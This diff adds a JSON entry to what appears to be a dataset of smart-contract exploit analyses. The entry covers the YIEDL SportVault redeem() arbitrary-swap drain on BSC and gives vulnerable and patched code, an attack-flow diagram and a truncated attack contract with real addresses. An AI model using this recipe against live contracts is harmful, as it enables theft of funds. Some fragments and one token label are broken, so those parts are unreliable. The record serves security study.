@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-04-XX_YIEDL_SportVaultRedeemArbitrarySwap",
+ "source_file": "2024/2024-04-XX_YIEDL_SportVaultRedeemArbitrarySwap.md",
+ "title": "YIEDL — SportVault redeem() unoswapTo Arbitrary Swap Analysis",
+ "date": "2024-04-01",
+ "protocol": "YIEDL",
+ "chain": "BSC",
+ "loss_raw": "Undisclosed (Multiple tokens: USDC, BTCB, BETH, BUSD)",
+ "loss_usd": null,
+ "root_cause": "The `unoswapTo()` call embedded in the `dataList` parameter of `SportVault.redeem()` is executed without validation, swapping contract assets directly to the attacker's address",
+ "attack_tx": null,
+ "vulnerable_contract": "SportVault 0x4eDda16A",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: redeem executes unoswapTo from dataList without validation\ncontract SportVault {\n    function redeem(\n        uint256 sharesToRedeem,\n        address receivingAsset,\n        uint256 minTokensToReceive,\n        bytes[] calldata dataList,  // ← arbitrary swap commands\n        bool useDiscount\n    ) external {\n        // dataList executes even when sharesToRedeem = 0\n        for (uint i = 0; i < dataList.length; i++) {\n            // Executes arbitrary swaps such as 1inch unoswapTo\n            (bool ok,) = swapRouter.call(dataList[i]);\n            require(ok);\n        }\n        // No recipient validation — the `to` address in dataList belongs to the attacker\n    }\n}\n\n//",
+  "// File: YIEDL_decompiled.sol\ncontract YIEDL {\n    function useUniswap() external {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: validate the destination address in dataList\nfunction redeem(uint256 sharesToRedeem, address receivingAsset, uint256 min,\n                bytes[] calldata dataList, bool useDiscount) external {\n    require(sharesToRedeem > 0, \"zero shares\");\n    for (uint i = 0; i < dataList.length; i++) {\n        // The recipient in dataList must be msg.sender\n        address recipient = decodeRecipient(dataList[i]);\n        require(recipient == msg.sender, \"invalid recipient\");\n        (bool ok,) = swapRouter.call(dataList[i]);\n        require(ok);\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Construct dataList:",
+  "→ [2] SportVault.redeem(0, USDC, 0, dataList, false)",
+  "each unoswapTo → SportVault assets → attacker",
+  "→ [3] USDC, BTCB, BETH, BUSD drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Construct dataList:\n  │         └─ unoswapTo(attacker, USDC, btcbAmount, ...)\n  │         └─ unoswapTo(attacker, BTCB, bethAmount, ...)\n  │         └─ unoswapTo(attacker, BETH, busdAmount, ...)\n  │\n  ├─→ [2] SportVault.redeem(0, USDC, 0, dataList, false)\n  │         └─ sharesToRedeem = 0 (no shares held)\n  │         └─ dataList executed sequentially\n  │         └─ each unoswapTo → SportVault assets → attacker\n  │\n  └─→ [3] USDC, BTCB, BETH, BUSD drained",
+  "interface ISportVault {\n    function redeem(\n        uint256 sharesToRedeem,\n        address receivingAsset,\n        uint256 minTokensToReceive,\n        bytes[] calldata dataList,\n        bool useDiscount\n    ) external;\n}\n\ncontract AttackContract {\n    ISportVault constant vault = ISportVault(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4);\n    address constant USDC  = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;\n    address constant BTCB  = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;\n    address constant BETH  = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;\n    address constant BUSD  = 0x55d398326f99059fF775485246999027B3197955;\n\n    function testExploit() external {\n        // [1] Construct unoswapTo calls: swap each token to the attacker's address\n        bytes[] memory dataList = new bytes[]"
+ ]
+}
